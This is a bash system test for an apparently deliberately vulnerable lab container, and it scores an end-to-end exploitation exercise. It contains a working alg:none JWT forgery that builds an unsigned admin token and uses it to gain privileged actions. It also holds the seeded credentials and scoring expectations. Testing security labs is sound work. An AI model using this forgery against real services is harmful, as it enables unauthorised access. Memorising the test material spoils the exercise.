#!/usr/bin/env bash
# System test: drives a real running jwt-none-easy container over HTTP with curl,
# exercising the full alg:none exploit chain end to end, then resets and verifies
# the reset took effect. Run this against a container already started from the
# image built from this directory's Dockerfile.
#
# Usage: BASE_URL=http://127.0.0.1:<port> SCORE_TOKEN=<token> ./live_container.test.sh

set -euo pipefail

BASE_URL="${BASE_URL:-http://127.0.0.1:5000}"
SCORE_TOKEN="${SCORE_TOKEN:-devtoken}"

pass=0
fail=0

check() {
  local description="$1"
  local actual="$2"
  local expected="$3"
  if [[ "$actual" == "$expected" ]]; then
    echo "PASS: $description"
    pass=$((pass + 1))
    return
  fi
  if python3 -c "import sys; sys.exit(0 if float(sys.argv[1]) == float(sys.argv[2]) else 1)" "$actual" "$expected" 2>/dev/null; then
    echo "PASS: $description"
    pass=$((pass + 1))
  else
    echo "FAIL: $description (expected [$expected], got [$actual])"
    fail=$((fail + 1))
  fi
}

b64url() {
  python3 -c "import sys,base64,json; print(base64.urlsafe_b64encode(json.dumps(json.loads(sys.argv[1]), separators=(',', ':')).encode()).decode().rstrip('='))" "$1"
}

echo "== wrong score token returns plain 404 on both endpoints =="
status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/score/not-the-real-token")
check "GET /score/<wrong-token> -> 404" "$status" "404"
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/score/not-the-real-token/reset")
check "POST /score/<wrong-token>/reset -> 404" "$status" "404"

echo "== reset before starting the chain =="
curl -s -X POST "$BASE_URL/score/$SCORE_TOKEN/reset" > /dev/null

echo "== login as the seeded normal user =="
login_response=$(curl -s -X POST "$BASE_URL/login" \
  -H 'content-type: application/json' \
  -d '{"username":"alice","password":"wonderland123"}')
token=$(python3 -c "import sys,json; print(json.loads(sys.argv[1])['token'])" "$login_response")
check "login returned a token" "$([[ -n "$token" ]] && echo yes || echo no)" "yes"

echo "== view posts and a post detail while authenticated (exploration) =="
status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/posts" -H "Authorization: Bearer $token")
check "GET /posts authenticated -> 200" "$status" "200"
status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/posts/1" -H "Authorization: Bearer $token")
check "GET /posts/1 authenticated -> 200" "$status" "200"

echo "== attempt pin as the normal user, expect denial (exploration) =="
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/api/posts/1/pin" -H "Authorization: Bearer $token")
check "POST /api/posts/1/pin as normal user -> 403" "$status" "403"

echo "== forge an alg:none admin token and pin the post (vulnerability_detection + exploitation) =="
header_b64=$(b64url '{"alg":"none","typ":"JWT"}')
payload_b64=$(b64url '{"sub":1,"username":"attacker","role":"admin"}')
forged="$header_b64.$payload_b64."

status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/api/posts/1/pin" -H "Authorization: Bearer $forged")
check "POST /api/posts/1/pin with forged alg:none admin token -> 200" "$status" "200"

echo "== dashboard reflects the full chain =="
score_json=$(curl -s "$BASE_URL/score/$SCORE_TOKEN?format=json")
echo "Score JSON: $score_json"

exploitation=$(python3 -c "import sys,json; print(json.loads(sys.argv[1])['scores']['exploitation'])" "$score_json")
check "exploitation score is 2.0 after the forged pin" "$exploitation" "2.0"

vuln=$(python3 -c "import sys,json; print(json.loads(sys.argv[1])['scores']['vulnerability_detection'])" "$score_json")
check "vulnerability_detection score is 1.0" "$vuln" "1.0"

recon=$(python3 -c "import sys,json; print(json.loads(sys.argv[1])['scores']['reconnaissance'])" "$score_json")
check "reconnaissance score is 1.0" "$recon" "1.0"

exploration=$(python3 -c "import sys,json; print(json.loads(sys.argv[1])['scores']['exploration'])" "$score_json")
check "exploration score is 1.5 (all three checkpoints fired)" "$exploration" "1.5"

echo "== dashboard HTML renders =="
status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/score/$SCORE_TOKEN")
check "GET /score/<token> (HTML) -> 200" "$status" "200"

echo "== reset clears everything =="
reset_response=$(curl -s -X POST "$BASE_URL/score/$SCORE_TOKEN/reset")
reset_status=$(python3 -c "import sys,json; print(json.loads(sys.argv[1])['status'])" "$reset_response")
check "reset response status field" "$reset_status" "reset"

score_json_after=$(curl -s "$BASE_URL/score/$SCORE_TOKEN?format=json")
exploitation_after=$(python3 -c "import sys,json; print(json.loads(sys.argv[1])['scores']['exploitation'])" "$score_json_after")
check "exploitation score is 0 after reset" "$exploitation_after" "0"

echo ""
echo "Results: $pass passed, $fail failed"
if [[ "$fail" -ne 0 ]]; then
  exit 1
fi
